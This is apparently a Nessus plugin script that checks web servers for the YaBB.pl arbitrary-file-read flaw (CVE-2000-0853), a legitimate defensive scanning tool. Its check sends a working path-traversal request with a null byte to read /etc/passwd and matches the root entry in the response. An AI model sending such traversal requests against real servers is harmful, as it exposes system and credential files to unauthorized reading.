#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10512);
 script_bugtraq_id(1668);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2000-0853");
 name["english"] = "YaBB Information Disclosure";
 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote web server contains a CGI script that suffers from an
information disclosure vulnerability. 

Description :

The 'YaBB.pl' CGI script is installed on the remote host.  This script
has a well known security flaw that lets an attacker read arbitrary
files with the privileges of the http daemon (usually root or nobody). 

See also :

http://archives.neohapsis.com/archives/bugtraq/2000-09/0072.html

Solution :

Remove 'YaBB.pl' or upgrade to the latest version.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of YaBB.pl";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

if (thorough_tests) dirs = make_list("/yabb", "/forum", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (cgi_dirs())
{
 req = string(dir, "/YaBB.pl?board=news&action=display&num=../../../../../../etc/passwd%00");
 req = http_get(item:req, port:port);
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
 	security_warning(port);
}
